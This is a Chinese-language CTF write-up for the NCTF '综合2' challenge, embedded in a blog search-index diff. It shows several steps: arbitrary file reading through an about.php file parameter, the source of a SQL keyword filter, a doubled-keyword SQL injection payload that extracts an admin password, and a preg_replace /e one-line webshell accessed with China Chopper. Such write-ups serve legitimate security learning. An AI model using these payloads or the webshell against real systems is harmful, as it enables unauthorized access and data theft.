@@ -483,4 +483,75 @@ ctf,ctf2,ctf3,ctf4,gbksqli,news</code></pre><p>0x637466 为十六进制ctf</p>
         <tag>弱类型</tag>
       </tags>
   </entry>
+  <entry>
+    <title>综合2</title>
+    <url>/2020/09/03/%E7%BB%BC%E5%90%882/</url>
+    <content><![CDATA[<h1 id="NCTF-综合2"><a href="#NCTF-综合2" class="headerlink" title="NCTF-综合2"></a>NCTF-综合2</h1><a id="more"></a>
+
+<p>进入页面，没什么特别的地方，随便点点</p>
+<p><img src="/2020/09/03/%E7%BB%BC%E5%90%882/1.png" alt></p>
+<p>留言可以正常提交，本以为有xss,但是已经提示不是xss</p>
+<p>看到最下面有个网站说明   <a href="http://cms.nuptzj.cn/about.php?file=sm.txt" target="_blank" rel="noopener">本CMS说明</a>  ，有用的内容如下</p>
+<blockquote>
+<p>config.php：存放数据库信息，移植此CMS时要修改 </p>
+<p>index.php：主页文件 </p>
+<p>passencode.php：Funny公司自写密码加密算法库 </p>
+<p>say.php：用于接收和处理用户留言请求 </p>
+<p>sm.txt：本CMS的说明文档 sae的information_schema表好像没法检索</p>
+<p>admin表结构 create table admin ( id integer, username text, userpass text, )  </p>
+</blockquote>
+<p> <code>http://cms.nuptzj.cn/about.php?file=sm.txt</code>可以使用php伪协议任意读取文件内容。 包括自己</p>
+<p>尝试读取index.php的源码，发现好像并没有什么用</p>
+<p>读取`about.php</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$file&#x3D;$_GET[&#39;file&#39;];</span><br><span class="line">if($file&#x3D;&#x3D;&quot;&quot; || strstr($file,&#39;config.php&#39;))&#123;   &#x2F;&#x2F; 有config.php</span><br><span class="line">	echo &quot;file参数不能为空！&quot;;</span><br><span class="line">	exit();</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	$cut&#x3D;strchr($file,&quot;loginxlcteam&quot;);   &#x2F;&#x2F;包含了 loginxlcteam页面</span><br><span class="line">	if($cut&#x3D;&#x3D;false)&#123;</span><br><span class="line">	$data&#x3D;file_get_contents($file);</span><br><span class="line">	$date&#x3D;htmlspecialchars($data);</span><br><span class="line">	echo $date;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		echo &quot;&lt;script&gt;alert(&#39;敏感目录，禁止查看！但是。。。&#39;)&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>读取config.php，无有用信息</p>
+<p><img src="/2020/09/03/%E7%BB%BC%E5%90%882/2.png" alt></p>
+<p>查看<code>loginxlcteam</code>,是个登录页面</p>
+<p><img src="/2020/09/03/%E7%BB%BC%E5%90%882/3.png" alt></p>
+<p>到此还是无从下手，参考大佬的博客 <a href="https://blog.csdn.net/zz_Caleb/article/details/88652838?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase" target="_blank" rel="noopener">https://blog.csdn.net/zz_Caleb/article/details/88652838?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase</a> </p>
+<p>在搜索页面中也存在有用信息</p>
+<p> <code>http://cms.nuptzj.cn/about.php?file=so.php</code>获取源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment">//so.php</span></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]!=<span class="string">"Xlcteam Browser"</span>)&#123; </span><br><span class="line">    <span class="comment">//必须修改http头，吧user-agent改成Xlcteam Browser</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'万恶滴黑阔，本功能只有用本公司开发的浏览器才可以用喔~'</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$id=$_POST[<span class="string">'soid'</span>];				<span class="comment">//post 一个soid</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'antiinject.php'</span>;   <span class="comment">//防注入的文件</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'antixss.php'</span>;      <span class="comment">//防xss的文件		</span></span><br><span class="line">$id=antiinject($id);		<span class="comment">//对id过滤</span></span><br><span class="line">$con = mysql_connect($db_address,$db_user,$db_pass) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"不能连接到数据库！！"</span>.mysql_error());</span><br><span class="line">mysql_select_db($db_name,$con);</span><br><span class="line">$id=mysql_real_escape_string($id);</span><br><span class="line">$result=mysql_query(<span class="string">"SELECT * FROM `message` WHERE display=1 AND id=$id"</span>);  <span class="comment">//sql查询，可能存在注入点</span></span><br><span class="line">$rs=mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">echo</span> htmlspecialchars($rs[<span class="string">'nice'</span>]).<span class="string">':&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;'</span>.antixss($rs[<span class="string">'say'</span>]).<span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line">mysql_free_result($result);</span><br><span class="line">mysql_free_result($file);</span><br><span class="line">mysql_close($con);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  <span class="comment">//antiinject.php源码</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">antiinject</span><span class="params">($content)</span></span></span><br><span class="line"><span class="function"> </span>&#123; </span><br><span class="line"> 	$keyword=<span class="keyword">array</span>(<span class="string">"select"</span>,<span class="string">"union"</span>,<span class="string">"and"</span>,<span class="string">"from"</span>,<span class="string">' '</span>,<span class="string">"'"</span>,<span class="string">";"</span>,<span class="string">'"'</span>,<span class="string">"char"</span>,<span class="string">"or"</span>,<span class="string">"count"</span>,<span class="string">"master"</span>,<span class="string">"name"</span>,<span class="string">"pass"</span>,<span class="string">"admin"</span>,<span class="string">"+"</span>,<span class="string">"-"</span>,<span class="string">"order"</span>,<span class="string">"="</span>); <span class="comment">//对一些sql注入时用到的关键词进行了过滤</span></span><br><span class="line">     $info=strtolower($content); </span><br><span class="line"> 	<span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;=count($keyword);$i++)</span><br><span class="line"> 	&#123; </span><br><span class="line"> 		$info=str_replace($keyword[$i], <span class="string">''</span>,$info); </span><br><span class="line"> 	&#125; </span><br><span class="line"> <span class="keyword">return</span> $info; </span><br><span class="line"> &#125; </span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>大致意思就是</p>
+<p>1.判断http请求头中的user-agent参数是否为Xlcteam Browser</p>
+<p>2.post参数soid</p>
+<p>3.对soid进行过滤后带入sql语句中查询</p>
+<p>于是抓包修改user-agent</p>
+<p>确定存在注入点</p>
+<p><img src="/2020/09/03/%E7%BB%BC%E5%90%882/4.png" alt></p>
+<p>由于之前提示了<strong>admin表结构 create table admin ( id integer, username text, userpass text, )</strong>  </p>
+<p>可直接写出查询语句</p>
+<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">(sselectelect<span class="comment">/**/</span>group<span class="constructor">_concat(<span class="params">userppassass</span>)</span><span class="comment">/**/</span>ffromrom<span class="comment">/**/</span>aadmindmin)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/03/%E7%BB%BC%E5%90%882/5.png" alt></p>
+<p>ASCII码转字符串结果为： fuckruntu </p>
+<p>登录</p>
+<p><img src="/2020/09/03/%E7%BB%BC%E5%90%882/6.png" alt></p>
+<p> <strong><a href="http://cms.nuptzj.cn/about.php?file=xlcteam.php" target="_blank" rel="noopener">http://cms.nuptzj.cn/about.php?file=xlcteam.php</a></strong>  查看源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line">$e = $_REQUEST[<span class="string">'www'</span>]; </span><br><span class="line">$arr = <span class="keyword">array</span>($_POST[<span class="string">'wtf'</span>] =&gt; <span class="string">'|.*|e'</span>,); </span><br><span class="line">array_walk($arr, $e, <span class="string">''</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>看样子是可以用菜刀连接的</p>
+<p> 那怎么利用小马呢，数组的value中是|.*|e，这里用到了正则匹配的preg_replace()的一个漏洞：<br>参考<a href="https://www.jb51.net/article/38714.htm" target="_blank" rel="noopener">https://www.jb51.net/article/38714.htm</a><br>简单来说就是正则中/e(这里和|e效果一样) 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。<br>所以我们可以传递preg_replace给www，这样array中的值就是第一个参数，键就是第二个参数，正好可以利用preg_replace的漏洞，然后会执行$_POST[‘wtf’]，就相当于一个一句话马了。<br>用菜刀连接： </p>
+<p>url:<a href="http://cms.nuptzj.cn/xlcteam.php?www=preg_replace" target="_blank" rel="noopener">http://cms.nuptzj.cn/xlcteam.php?www=preg_replace</a></p>
+<p>密码：wtf</p>
+<p><img src="/2020/09/03/%E7%BB%BC%E5%90%882/7.png" alt></p>
+<p><strong>总结：算是一道比较难的题目了，涉及到知识点也很多，还需要多看看！！！</strong></p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>sql</tag>
+        <tag>php</tag>
+        <tag>shell</tag>
+      </tags>
+  </entry>
 </search>
